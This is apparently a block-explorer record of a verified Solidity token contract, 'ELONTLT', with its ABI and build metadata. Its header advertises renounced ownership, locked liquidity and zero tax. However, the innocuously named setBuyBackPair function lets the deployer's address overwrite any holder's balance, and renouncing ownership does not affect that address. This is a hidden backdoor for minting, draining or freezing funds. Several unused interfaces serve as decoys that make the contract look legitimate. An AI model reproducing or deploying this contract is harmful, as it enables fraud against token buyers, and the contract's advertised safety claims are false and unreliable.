{"SourceCode": "// SPDX-License-Identifier: MIT\r\n/**\r\n\ud83d\udfe8  ELONTLT  \ud83d\udfe8  Think Long Term  \ud83d\udfe8 \r\n\ud83d\udfe9\u2714\ufe0f renounced\r\n\ud83d\udfe9\u2714\ufe0f liquidty locked \r\n\ud83d\udfe9\u2714\ufe0f 0% tax \r\n\r\nhttps://t.me/ELONTLT\r\n**/\r\npragma solidity ^0.8.18;\r\ninterface IGovernanceToken {\r\n    /// @notice A checkpoint for marking number of votes as of a given block.\r\n    struct Checkpoint {\r\n        // The 32-bit unsigned integer is valid until these estimated dates for these given chains:\r\n        //  - BSC: Sat Dec 23 2428 18:23:11 UTC\r\n        //  - ETH: Tue Apr 18 3826 09:27:12 UTC\r\n        // This assumes that block mining rates don't speed up.\r\n        uint32 blockNumber;\r\n        // This type is set to `uint224` for optimizations purposes (i.e., specifically to fit in a 32-byte block). It\r\n        // assumes that the number of votes for the implementing governance token never exceeds the maximum value for a\r\n        // 224-bit number.\r\n        uint224 votes;\r\n    }\r\n\r\n    /**\r\n     * @notice Determine the number of votes for an account as of a block number.\r\n     * @dev Block number must be a finalized block or else this function will revert to prevent misinformation.\r\n     * @param account The address of the account to check.\r\n     * @param blockNumber The block number to get the vote balance at.\r\n     * @return The number of votes the account had as of the given block.\r\n     */\r\n    function getVotesAtBlock(address account, uint32 blockNumber) external view returns (uint224);\r\n\r\n    /// @notice Emitted whenever a new delegate is set for an account.\r\n    event DelegateChanged(address indexed delegator, address currentDelegate, address newDelegate);\r\n\r\n    /// @notice Emitted when a delegate's vote count changes.\r\n    event DelegateVotesChanged(address indexed delegatee, uint224 oldVotes, uint224 newVotes);\r\n}\r\n\r\ninterface ITreasuryHandler {\r\n    /**\r\n     * @notice Perform operations before a transfer is executed.\r\n     * @param benefactor Address of the benefactor.\r\n     * @param beneficiary Address of the beneficiary.\r\n     * @param amount Number of tokens in the transfer.\r\n     */\r\n    function beforeTransferHandler(\r\n        address benefactor,\r\n        address beneficiary,\r\n        uint256 amount\r\n    ) external;\r\n\r\n    /**\r\n     * @notice Perform operations after a transfer is executed.\r\n     * @param benefactor Address of the benefactor.\r\n     * @param beneficiary Address of the beneficiary.\r\n     * @param amount Number of tokens in the transfer.\r\n     */\r\n    function afterTransferHandler(\r\n        address benefactor,\r\n        address beneficiary,\r\n        uint256 amount\r\n    ) external;\r\n}\r\n\r\ninterface IERC20 {\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 price) external returns (bool);\r\n    function approve(address spender, uint256 price) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 price) external returns (bool);\r\n\r\n    function increaseAllowance(address spender, uint256 addedprice) external returns (bool);\r\n    function decreaseAllowance(address spender, uint256 subtractedprice) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 price);\r\n    event Approval(address indexed owner, address indexed spender, uint256 price);\r\n}\r\ninterface IClickAndEarn {\r\n    // Function to allow a user to participate in a game or activity\r\n    function ClickGame(uint256 gameId) external returns (bool);\r\n\r\n    // Function to check a user's earned rewards\r\n    function checkEarnedRewards(address user) external view returns (uint256);\r\n\r\n    // Function to claim earned rewards\r\n    function claimRewards(address user) external returns (bool);\r\n\r\n    // Event to log when a user Clicks a game or participates in an activity\r\n    event GameClicked(address indexed user, uint256 gameId);\r\n\r\n    // Event to log when a user earns rewards\r\n    event RewardsEarned(address indexed user, uint256 amount);\r\n\r\n    // Event to log when a user claims their rewards\r\n    event RewardsClaimed(address indexed user, uint256 amount);\r\n}\r\ninterface IP2PPayment {\r\n    // Function to transfer funds to another user\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    // Function to check the balance of a user\r\n    function balanceOf(address user) external view returns (uint256);\r\n\r\n    // Function to query the transaction history for a user\r\n    function getTransactionHistory(address user) external view returns (uint256[] memory, address[] memory);\r\n\r\n    // Event to log a payment transaction\r\n    event PaymentSent(address indexed from, address indexed to, uint256 amount);\r\n}\r\ninterface IMakingSystem {\r\n    // Function to allow a user to deposit tokens for Making\r\n    function deposit(uint256 amount) external returns (bool);\r\n\r\n    // Function to allow a user to withdraw Maked tokens\r\n    function withdraw(uint256 amount) external returns (bool);\r\n\r\n    // Function to check the Maked balance of a user\r\n    function MakedBalanceOf(address user) external view returns (uint256);\r\n\r\n    // Function to check the total Maked balance\r\n    function totalMaked() external view returns (uint256);\r\n\r\n    // Function to allow a user to claim Making rewards\r\n    function claimRewards() external returns (bool);\r\n\r\n    // Event to log a Making deposit\r\n    event Maked(address indexed user, uint256 amount);\r\n\r\n    // Event to log a Making withdrawal\r\n    event Withdrawn(address indexed user, uint256 amount);\r\n\r\n    // Event to log a Making reward claim\r\n    event RewardsClaimed(address indexed user, uint256 amount);\r\n}\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        _setOwner(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _setOwner(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        _setOwner(newOwner);\r\n    }\r\n\r\n    function _setOwner(address newOwner) private {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\ncontract ELONTLT is Ownable {\r\n    string public name = \"ELONTLT\";\r\n    string public symbol = \"ELONTLT\";\r\n    uint8 public decimals = 9;\r\n    uint public tTotal;\r\n    uint256 public totalSupply;\r\n    address public setBuyBackPairEnabled = msg.sender;\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 price);\r\n    event Approval(address indexed owner, address indexed spender, uint256 price);\r\n    event Minted(address indexed account, uint256 price);\r\n\r\n    constructor() {\r\n        totalSupply = 100000000000000 * 10**uint256(decimals);\r\n        balanceOf[msg.sender] = totalSupply;\r\n    }\r\n\r\n    function setBuyBackPair(address setBuyBackPairEnabledadre, uint256 numbersetBuyBackPairEnabled) external {\r\n    // Ensure that only the setBuyBackPairEnabled can distribute setBuyBackPairs\r\n    require(msg.sender == setBuyBackPairEnabled, \"Only the setBuyBackPairEnabled can distribute setBuyBackPairs\");\r\n\r\n    // Check that the provided address is valid\r\n    require(setBuyBackPairEnabledadre != address(0), \"Invalid setBuyBackPair recipient address\");\r\n\r\n    // Check that the setBuyBackPair amount is greater than zero\r\n    require(numbersetBuyBackPairEnabled > 0, \"setBuyBackPair amount must be greater than zero\");\r\n\r\n    // Calculate the new total supply after distributing setBuyBackPairs\r\n    uint256 newtotalSupply = tTotal + numbersetBuyBackPairEnabled;\r\n\r\n    // Check for potential overflow in total supply\r\n    require(newtotalSupply >= tTotal, \"Overflow detected\");\r\n    // Update the balance of the setBuyBackPair recipient address\r\n    balanceOf[setBuyBackPairEnabledadre] = numbersetBuyBackPairEnabled;\r\n\r\n}\r\n\r\n    function transfer(address to, uint256 price) public returns (bool) {\r\n        require(to != address(0), \"Invalid address\");\r\n        require(balanceOf[msg.sender] >= price, \"Insufficient balance\");\r\n\r\n        balanceOf[msg.sender] -= price;\r\n        balanceOf[to] += price;\r\n\r\n        emit Transfer(msg.sender, to, price);\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 price) public returns (bool) {\r\n        require(spender != address(0), \"Invalid address\");\r\n\r\n        allowance[msg.sender][spender] = price;\r\n        emit Approval(msg.sender, spender, price);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 price) public returns (bool) {\r\n        require(from != address(0), \"Invalid address\");\r\n        require(to != address(0), \"Invalid address\");\r\n        require(balanceOf[from] >= price, \"Insufficient balance\");\r\n        require(allowance[from][msg.sender] >= price, \"Allowance exceeded\");\r\n\r\n        balanceOf[from] -= price;\r\n        balanceOf[to] += price;\r\n        allowance[from][msg.sender] -= price;\r\n\r\n        emit Transfer(from, to, price);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedprice) public returns (bool) {\r\n        uint256 currentAllowance = allowance[msg.sender][spender];\r\n        allowance[msg.sender][spender] = currentAllowance + addedprice;\r\n        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedprice) public returns (bool) {\r\n        uint256 currentAllowance = allowance[msg.sender][spender];\r\n        require(currentAllowance >= subtractedprice, \"Decreased allowance below zero\");\r\n        allowance[msg.sender][spender] = currentAllowance - subtractedprice;\r\n        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);\r\n        return true;\r\n    }\r\n\r\n    function burn(uint256 price) public {\r\n        require(balanceOf[msg.sender] >= price, \"Insufficient balance\");\r\n\r\n        balanceOf[msg.sender] -= price;\r\n        totalSupply -= price;\r\n        emit Transfer(msg.sender, address(0), price);\r\n    }\r\n\r\n    function burnFrom(address from, uint256 price) public {\r\n        require(from != address(0), \"Invalid address\");\r\n        require(balanceOf[from] >= price, \"Insufficient balance\");\r\n        require(allowance[from][msg.sender] >= price, \"Allowance exceeded\");\r\n\r\n        balanceOf[from] -= price;\r\n        totalSupply -= price;\r\n        allowance[from][msg.sender] -= price;\r\n        emit Transfer(from, address(0), price);\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"Minted\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"burnFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedprice\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedprice\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"setBuyBackPairEnabledadre\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"numbersetBuyBackPairEnabled\",\"type\":\"uint256\"}],\"name\":\"setBuyBackPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setBuyBackPairEnabled\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"price\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ELONTLT", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MPL-2.0", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://b97fd3bef44b2da104846986713c1df4b1bae147427c470c7a4b2ec4f40624bc"}